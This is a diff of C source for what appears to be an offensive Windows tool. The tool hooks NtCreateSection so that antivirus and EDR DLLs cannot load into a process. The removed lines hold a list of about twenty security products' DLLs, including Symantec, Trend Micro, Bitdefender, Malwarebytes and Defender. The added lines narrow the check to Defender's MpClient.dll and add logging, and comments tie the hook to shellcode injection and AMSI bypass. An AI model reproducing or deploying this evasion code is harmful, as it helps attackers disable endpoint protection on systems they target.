@@ -108,9 +108,9 @@ BOOL StrStrIA(char* str1, char* str2)
 {
 	int i = 0;
 	int j = 0;
-        // strlen cannot be used here in PIC mode, so we need an alternative function
+    // strlen cannot be used here in PIC mode, so we need an alternative function
 	int len1 = my_strlen(str1);
-        int len2 = my_strlen(str2);
+    int len2 = my_strlen(str2);
 	while (i < len1) {
 		if (str1[i] == str2[j]) {
 			i++;
@@ -241,16 +241,21 @@ BOOL __attribute__((noinline)) my_GetFinalPathNameByHandleA(HANDLE hFile, char* 
     }
 }
 
+
 __stdcall NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle)
 {
+    wchar_t log[] = { '\r','\n','[', '+', ']', ' ', 'I', 'n', ' ', 't', 'h', 'e', ' ', 'h', 'o', 'o', 'k', '!', '\r','\n', 0 };
+    PWCHAR first = (PWCHAR)&log;
+    log_to_file(first);
+
     BOOL nomoreSkip = FALSE;
     char check[1] = { 0x00 };
 
     // There are some use cases (e.G. ThreadlessInject Shellcode execution), in which we don't want to interrupt the process initialization (which also uses NtCreateSection).
     // For those Use-Cases, we have the option to skip one or more NtCreateSection Calls before actually doing something in the hook function.
     // Uncommented, as this function leads to us needing RWX Permissions all over the time. And the hook looks "better" when set to RX only.
-
-    if (my_charcmp((char*)firstRun, (char*)&check, 1) == 0) // process initialization only called NtCreateSection once in my tests
+    
+	if (my_charcmp((char*)firstRun, (char*)&check, 1) == 0) // process initialization only called NtCreateSection once in my tests
     {
         nomoreSkip = TRUE;
     }
@@ -259,6 +264,8 @@ __stdcall NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess
         // increase the value of firstRun by once
         increaseChar((char*)firstRun);
     }
+    
+
 
     char* lpFilename[256];
     if ((FileHandle != NULL) && nomoreSkip == TRUE)
@@ -266,57 +273,23 @@ __stdcall NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess
         if (my_GetFinalPathNameByHandleA(FileHandle, (char*)lpFilename, 256) != 0)
         {
 
-        char symamsidll[] = "symamsi.dll";
-        char ccVrTrstdll[] = "ccVrTrst.dll";
-        char ccSetdll[] = "ccSet.dll";
-        char ccLibdll[] = "ccLib.dll";
-        char EFACli64dll[] = "EFACli64.dll";
-        char ccIPCdll[] = "ccIPC.dll";
-        char IPSEng32dll[] = "IPSEng32.dll";
-        char AviraSystemSpeedUpUIShellExtensiondll[] = "Avira.SystemSpeedUp.UI.ShellExtension.dll";
-        char spapi64dll[] = "spapi64.dll";
-        char fsamsi64dll[] = "fsamsi64.dll";
-        char fs_ccf_ipc_64dll[] = "fs_ccf_ipc_64.dll";
-        char TmUmEvt64dll[] = "TmUmEvt64.dll";
-        char tmmon64dll[] = "tmmon64.dll";
-        char TmAMSIProvider64dll[] = "TmAMSIProvider64.dll";
-        char TmOverlayIcondll[] = "TmOverlayIcon.dll";
-        char WRusrdll[] = "WRusr.dll";
-        char bdhkm64dll[] = "bdhkm64.dll";
-        char atcuf64dll[] = "atcuf64.dll";
-        char mbaedll[] = "mbae.dll";
-        char MpClientdll[] = "MpClient.dll";
-        char MpOAVdll[] = "MpOAV.dll";
-        if (
-        (StrStrIA((char*)lpFilename, (char*)symamsidll)) || 
-        (StrStrIA((char*)lpFilename, (char*)ccVrTrstdll)) || 
-        (StrStrIA((char*)lpFilename, (char*)ccSetdll)) || 
-        (StrStrIA((char*)lpFilename, (char*)ccLibdll)) || 
-        (StrStrIA((char*)lpFilename, (char*)EFACli64dll)) || 
-        (StrStrIA((char*)lpFilename, (char*)ccIPCdll)) || 
-        (StrStrIA((char*)lpFilename, (char*)IPSEng32dll)) || 
-        (StrStrIA((char*)lpFilename, (char*)AviraSystemSpeedUpUIShellExtensiondll)) || 
-        (StrStrIA((char*)lpFilename, (char*)spapi64dll)) || 
-        (StrStrIA((char*)lpFilename, (char*)fsamsi64dll)) || 
-        (StrStrIA((char*)lpFilename, (char*)fs_ccf_ipc_64dll)) || 
-        (StrStrIA((char*)lpFilename, (char*)TmUmEvt64dll)) || 
-        (StrStrIA((char*)lpFilename, (char*)tmmon64dll)) || 
-        (StrStrIA((char*)lpFilename, (char*)TmAMSIProvider64dll)) || 
-        (StrStrIA((char*)lpFilename, (char*)TmOverlayIcondll)) || 
-        (StrStrIA((char*)lpFilename, (char*)WRusrdll)) || 
-        (StrStrIA((char*)lpFilename, (char*)bdhkm64dll)) || 
-        (StrStrIA((char*)lpFilename, (char*)atcuf64dll)) || 
-        (StrStrIA((char*)lpFilename, (char*)mbaedll)) || 
-        (StrStrIA((char*)lpFilename, (char*)MpClientdll)) || 
-        (StrStrIA((char*)lpFilename, (char*)MpOAVdll))
-        ) {
-                return 0xC0000054;
-        //return 0xC0000054; // 0 does not work here, as Powershell than tries to use AMSI and the process crashes. So we're using STATUS_FILE_LOCK_CONFLICT to inform about the Section wasn't creatable.
+            char amsiShort[] = /*amsi.dll */{ 'M', 'p', 'C', 'l', 'i', 'e', 'n', 't', '.', 'd', 'l', 'l', 0 };
+            //char amsiShort[] = /*amsi.dll */{ 'a', 'm', 's', 'i', '.', 'd', 'l', 'l', 0 };
+
+            if (StrStrIA((char*)lpFilename, (char*)amsiShort))
+            {
+
+                wchar_t log2[] = { '\r','\n','[', '+', ']', ' ', 'W', 'D', 'E', 'F', ' ', 'l', 'o', 'a', 'd', ' ', 'i', 'n','t','e','r','c','e', 'p', 't', 'e', 'd', '!', '\r','\n','\0' };
+                PWCHAR amsiLog = (PWCHAR)&log2;
+                log_to_file(amsiLog);
+
+                return 0xC0000054; // 0 does not work here, as Powershell than tries to use AMSI and the process crashes. So we're using STATUS_FILE_LOCK_CONFLICT to inform about the Section wasn't creatable.
                 // but 0 might is the better approach for EDR DLLs, as you won't prompt an GUI error notification with that.
+
             }
+            
         }
     }
-
     // we are going to return the NTSTATUS of the original function afterwards
     return restore_hook_ntcreatesection(hSection, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
 
